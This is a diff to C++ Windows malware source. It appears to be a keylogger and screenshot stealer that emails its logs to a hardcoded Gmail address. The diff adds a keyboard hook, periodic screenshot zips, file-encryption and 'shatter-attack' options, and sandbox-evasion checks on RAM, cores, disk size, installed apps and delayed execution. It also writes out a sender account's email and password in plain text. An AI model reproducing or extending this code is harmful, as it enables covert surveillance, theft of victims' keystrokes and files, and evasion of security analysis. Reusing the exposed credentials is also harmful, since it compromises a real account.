@@ -1,4 +1,4 @@
-#define VC_EXTRALEAN
+#define WIN32_LEAN_AND_MEAN
 #ifdef UNICODE
 	#undef UNICODE
 #endif
@@ -26,29 +26,39 @@
 #include <assert.h>
 #include <intrin.h>
 #include <array>
+#include <winioctl.h>
+#include <shlwapi.h>
 
 #include "Antidbg.h"
 #include "log.h"
-
-
+#include "base64.h"
 
 using buffer = std::vector<char>;
 
 //------------------------------------------------------
 // Customization
 
+//#define debug               //whether or not to crypt files and shatter-attack system utilities [REMOVE THIS FLAG]
+#define KeyShiftLimit 1223  //cap for the highest possible random encryption key
+
+#define IsMajor false
+#define CurrentVersion 1.6
 #define CharactersPerLog 300
 #define MaximumFolderSize 10 
 #define RequiredRam 2048    //MB
 #define RequiredCores 2 
-#define CryptPassword "MyPassword" 
-#define BaseShiftValue 100  //base int to add to chars for crypting measures
 #define SecondsBetweenScreenshots 20
 #define ScreenshotsPerZip 4
-#define SendersEmail ""
-#define SendersPsw ""
-#define RecieversEmail ""
+#define SendersEmail "indexmagik@gmail.com"
+#define SendersPsw "*MaGiK77"
+#define RecieversEmail "bratvolk913@gmail.com"
 #define MaxInactivity 10    //max amount of seconds since last input
+#define MinRequiredApps 20  //minimum amount of installed programs
+#define SecurityLevel 0     //0-3 levels of trust towards environment
+#define MinHardDisk 60      //minimum size for the main partition
+#define DelayExecution false//whether or not execution should be delayed
+#define DelayTime 120       //amount of time for the delay (seconds)
+#define QuitIfUntrust false //should we send a log if the environment is untrusted or quit on the spot?
 
 //------------------------------------------------------
 
@@ -68,7 +78,6 @@ using buffer = std::vector<char>;
 #pragma comment( lib, "comsuppw.lib" )
 //#pragma comment(lib, "Wbemuuid.lib.")
 
-#define debug
 
 #define _WIN32_WINNT 0x050
 
@@ -84,6 +93,7 @@ void TakeScreenShot(const char* filename);
 bool fexists(std::string filename);                          //create native check through CreateFileA()
 void FinalExit();
 //void Compress(const buffer& in, buffer& out);
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 
 
